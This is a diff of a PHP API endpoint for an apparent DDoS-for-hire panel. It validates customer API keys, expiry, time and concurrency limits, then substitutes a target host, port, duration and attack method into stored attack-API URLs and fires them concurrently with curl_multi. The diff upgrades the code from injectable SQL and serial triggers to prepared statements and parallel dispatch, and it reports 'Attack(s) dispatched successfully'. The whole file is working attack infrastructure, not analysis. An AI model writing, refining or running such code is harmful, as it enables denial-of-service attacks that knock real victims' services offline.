@@ -1,58 +1,103 @@
 <?php
-$mysqli = new mysqli("localhost", "username", "password", "dbname"); // Ganti sesuai
-if ($mysqli->connect_error) {
-    http_response_code(500);
-    die(json_encode(["message" => "DB connection failed."]));
+include 'config.php';
+header('Content-Type: application/json');
+
+if(!isset($_GET['action']) || $_GET['action']!=='startAttack'){
+    http_response_code(400);
+    exit(json_encode(['message'=>'Invalid action.']));
 }
 
-header("Content-Type: application/json");
+$in = json_decode(file_get_contents('php://input'), true);
+$host = trim($in['host'] ?? '');
+$port = intval($in['port'] ?? 0);
+$time = intval($in['time'] ?? 0);
+$method = trim($in['method'] ?? '');
+$key = trim($in['key'] ?? '');
+$concs = intval($in['concurrents'] ?? 0);
+$remoteIp = $_SERVER['REMOTE_ADDR'];
 
-if ($_GET['action'] === 'startAttack') {
-    $postData = json_decode(file_get_contents("php://input"), true);
-
-    $host = htmlspecialchars($postData['host']);
-    $port = intval($postData['port']);
-    $time = intval($postData['time']);
-    $method = htmlspecialchars($postData['method']);
-    $key = $mysqli->real_escape_string($postData['key']);
-    $concurrents = intval($postData['concurrents']);
-
-    if (empty($host) || empty($port) || empty($time) || empty($method) || empty($key)) {
-        echo json_encode(["message" => "Missing parameters."]);
-        exit;
-    }
-
-    $user = $mysqli->query("SELECT * FROM users WHERE apikey = '$key' LIMIT 1")->fetch_assoc();
-    if (!$user) {
-        echo json_encode(["message" => "Invalid API key."]);
-        exit;
-    }
-
-    if ($time > $user['maxtime']) {
-        echo json_encode(["message" => "Time exceeds limit ({$user['maxtime']}s)."]);
-        exit;
-    }
-
-    if ($concurrents > $user['concurrents']) {
-        echo json_encode(["message" => "Concurrents exceeds limit ({$user['concurrents']})."]);
-        exit;
-    }
-
-    $result = $mysqli->query("SELECT * FROM apis");
-    while ($row = $result->fetch_assoc()) {
-        $url = str_replace(
-            ['{host}', '{port}', '{time}', '{method}'],
-            [$host, $port, $time, $method],
-            $row['apiurl']
-        );
-
-        for ($i = 0; $i < $concurrents; $i++) {
-            file_get_contents($url); // Simple trigger
-        }
-    }
-
-    echo json_encode(["message" => "Attack sent successfully."]);
-    exit;
+if(!$host||!$port||!$time||!$method||!$key||!$concs){
+    exit(json_encode(['message'=>'Missing parameters.']));
 }
 
-echo json_encode(["message" => "Invalid action."]);
+$pdo = dbConnect();
+$stmt = $pdo->prepare("SELECT * FROM users WHERE api_key = ?");
+$stmt->execute([$key]);
+$user = $stmt->fetch(PDO::FETCH_ASSOC);
+if(!$user){
+    exit(json_encode(['message'=>'Invalid API key.']));
+}
+
+if($user['ip_address'] !== null){
+    $allowed = array_map('trim', explode(',', $user['ip_address']));
+    if(!in_array($remoteIp, $allowed)){
+        http_response_code(403);
+        exit(json_encode(['message'=>"Access denied from IP {$remoteIp}."]));
+    }
+}
+
+if(new DateTime() > new DateTime($user['expiry'])){
+    exit(json_encode(['message'=>'API key expired.']));
+}
+
+if($time > $user['maxtime']){
+    exit(json_encode(['message'=>"Max time is {$user['maxtime']}s."]));
+}
+if($concs > $user['concurrents']){
+    exit(json_encode(['message'=>"Max concurrents is {$user['concurrents']}."]));
+}
+
+$stmt = $pdo->prepare("SELECT 1 FROM blacklist WHERE host = ?");
+$stmt->execute([$host]);
+if($stmt->fetch()){
+    exit(json_encode(['message'=>'Target is blacklisted.']));
+}
+
+$stmt = $pdo->query("SELECT apiurl FROM apis");
+$urls = [];
+while($row = $stmt->fetch(PDO::FETCH_ASSOC)){
+    $urls[] = str_replace(
+        ['{host}','{port}','{time}','{method}'],
+        [$host,$port,$time,$method],
+        $row['apiurl']
+    );
+}
+
+$mh = curl_multi_init();
+$handles = [];
+foreach($urls as $url){
+    for($i=0;$i<$concs;$i++){
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        curl_multi_add_handle($mh, $ch);
+        $handles[] = ['ch'=>$ch];
+    }
+}
+$running = null;
+do {
+    curl_multi_exec($mh, $running);
+    curl_multi_select($mh);
+} while($running);
+
+foreach($handles as $h){
+    $ch   = $h['ch'];
+    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $status = ($code>=200 && $code<300)?'success':'fail';
+
+    $log = $pdo->prepare("
+      INSERT INTO logs
+        (user_id,host,port,time,method,concurrents,status)
+      VALUES (?,?,?,?,?,?,?)
+    ");
+    $log->execute([
+        $user['id'],$host,$port,$time,
+        $method,$concs,$status
+    ]);
+
+    curl_multi_remove_handle($mh, $ch);
+    curl_close($ch);
+}
+curl_multi_close($mh);
+
+echo json_encode(['message'=>'Attack(s) dispatched successfully.']);
